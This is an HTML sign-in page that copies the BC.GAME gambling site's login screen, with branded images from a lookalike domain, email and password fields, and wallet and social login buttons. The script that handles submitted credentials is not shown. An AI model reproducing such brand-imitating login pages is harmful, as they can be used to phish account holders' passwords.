<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>BC Game Login</title>
  <link rel="stylesheet" href="styles.css">
<script src="script.js" defer></script>
</head>
<body>
  <img src="https://bcgame.top/assets/logo/logo.png" alt="BC.GAME Logo" class="logo">
  <div class="container">
    <!-- Header Section -->
    <div class="header">
      <img src="https://bcgame.top/modules/account2/assets/bg_m-cac172cf.png" alt="Header Background" class="header-bg">
      <div class="header-content">
        <h1>Sign In</h1>
      </div>
    </div>


    <!-- Form Section -->
    <div class="form-section">
      <form id="login-form" class="login-form">
        <div class="input-group">
          <input id="email-phone" type="text" placeholder="Email / Phone Number" required>
        </div>
        <div class="input-group">
          <input id="password" type="password" placeholder="Password" required>
          <span class="show-password"></span>
        </div>
        <a href="#" class="forgot-password">Forgot your password?</a>
        <button type="submit" class="btn-signin">Sign In</button>
       
      </form>
      <div class="create-account">
        New to BC.GAME? <a href="#">Create account</a>
      </div>
    <div style="text-align: center; margin-top: 50px;">
    <span style="color: #9e9e9e; font-size: 24px; font-weight: bold;">G</span>
    </div>
      
   

    <!-- Social Login Section -->
    <div class="social-login">
      <p class="line-text"><span>Log in directly with</span></p>
      <button class="passkey-button">
        <img src="https://img.icons8.com/ios-filled/50/ffffff/user-group-man-man.png" alt="Passkey Icon" />
        Sign In with passkey
    </button>
      <div class="social-icons">
        
        <button><img src="fox.png" alt="MetaMask"></button>
<button><img src="google.png" alt="Google"></button>
<button><img src="whatsapp.png" alt="WhatsApp"></button>
<button><img src="telegram.png" alt="Telegram"></button>
<button><img src="line.png" alt="Line"></button>
<button><img src="letter-w.png" alt="WeChat"></button>
<button><img src="images/telegram.png" alt="Telegram"></button>
    </div>
  </div>

  <script src="script.js"></script>
</body>
</html>
